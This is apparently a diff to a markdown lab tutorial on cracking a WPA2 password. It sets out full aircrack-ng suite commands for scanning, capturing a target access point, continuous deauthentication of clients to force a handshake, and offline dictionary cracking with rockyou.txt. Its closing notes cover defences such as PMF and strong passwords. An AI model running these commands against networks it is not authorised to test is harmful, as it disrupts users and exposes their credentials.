@@ -83,78 +83,74 @@ sudo airodump-ng wlan0mon
 
 Look for:
 
-ESSID of your lab network
-BSSID (MAC of the access point)
-Channel
-Any connected clients (STATION section)
+- **BSSID** (MAC of the access point)
+- **CHANNEL** (Channel 1, in my case)
+- **STATION** (connected clients)
 
-Note the **channel** and **BSSID**.
 > For privacy reasons, I have hidden all detected Wi-Fi networks and connected devices in the screenshot, except for my test network, which remains visible for demonstration purposes.
+
+> **NOTE:** I noticed that `airodump-ng` was scanning only the 2.4 GHz band (CH 1 to 11), while my phone was connected to a 5 GHz network. While working with both frequency bands, I encountered some additional challenges when testing 5 GHz networks. Therefore, I've decided to split this guide into 2 separate parts: **2.4 GHz** and **5 GHz**. 
+
+To explicitly scan both bands, specify the `--band` parameter (my adapter doesn't support 6 GHz):
+
+```bash
+sudo airodump-ng --band abg wlan0mon
+```
+
+The `abg` parameter enables scanning of both supported frequency bands:
+- `a` — 5 GHz
+- `b/g` — 2.4 GHz
 
 Cancel with Ctrl+C when ready.
 
-3. Capture traffic to a file
+## 3. Capture traffic to a file
+### 3.1 Capture 2.4 GHz traffic
+
 Lock airodump to the target network so the screen stays clean and the client list remains visible:
-Bashsudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
+```bash
+sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
+```
 Example:
-Bashsudo airodump-ng -c 1 --bssid 28:C6:XX:XX:XX:XX -w WirelessHackingWPA wlan0mon
-Leave this terminal running. It will write files such as WirelessHackingWPA-01.cap.
+```bash
+sudo airodump-ng -c 11 --bssid 8A:D3:43:01:D1:DD -w TestingWPA2 wlan0mon
+```
+Leave this terminal running. It will write files such as *TestingWPA2-01.cap*
 
-4. Force a handshake with deauthentication
+## 4. Force a handshake with deauthentication
+
 Open a second terminal and send deauth packets to a connected client (or broadcast):
-Bashsudo aireplay-ng --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
+```bash
+sudo aireplay-ng --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
+```
 
---deauth 0 = keep sending until you stop it
--a = access point BSSID
--c = client MAC (recommended)
+`--deauth 0` = keep sending until you stop it
+`-a` = access point BSSID
+`-c` = client MAC (recommended)
 
-After several deauth packets, the client should reconnect and generate a 4-way handshake.
+After several deauth packets, the client will reconnect and generate a 4-way handshake. Stop both tools (Ctrl+C).
 
-In the first terminal you should see:
-textWPA handshake: XX:XX:XX:XX:XX:XX
-Stop both tools (Ctrl+C).
+## 5. Dictionary attack with aircrack-ng
 
-5. Dictionary attack with aircrack-ng
-Bashaircrack-ng -w /usr/share/wordlists/rockyou.txt WirelessHackingWPA-01.cap
+After stopping the capture process, several files were created in our home directory. These files contain the captured handshake data and related information. They were saved using the filename prefix specified with the `-w` parameter. We specifically need the `.cap` file, as it contains the captured Wi-Fi packets, including the WPA2 handshake.
 
--w specifies the wordlist
-Without -w aircrack-ng will attempt a much slower pure brute-force
+```bash
+aircrack-ng TestingWPA2-01.cap -w /usr/share/wordlists/rockyou.txt
+```
+`-w` specifies the wordlist. Without `-w` aircrack-ng will attempt a much slower pure brute-force
 
+**Aircrack-ng** started the offline password cracking process, and CPU usage began increasing significantly.
 If the password exists in the wordlist, aircrack-ng will display:
-textKEY FOUND! [ the_password ]
-If the password is not in the list, you will eventually see KEY NOT FOUND.
-
-Quick command reference
-
-
+```text
+KEY FOUND! [ the_password ]
+```
+If the password is not in the list, you will eventually see `KEY NOT FOUND`.
 
 
 
+> A “strong” looking password (mixed case + numbers + symbols) can still be cracked quickly if it appears in a common wordlist such as `rockyou.txt`.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-ToolPurposeairmon-ngPut card into Monitor modeairodump-ngDiscover networks & capture trafficaireplay-ngDeauthentication attackaircrack-ngOffline dictionary attack
-
-Notes from the lab
-
-A “strong” looking password (mixed case + numbers + symbols) can still be cracked quickly if it appears in a common wordlist such as rockyou.txt.
 Capture quality matters: you need a complete 4-way handshake.
+
 VPN on the client does not prevent handshake capture (it starts after Layer 2).
+
 Protected Management Frames (PMF / 802.11w) can make deauth less effective.
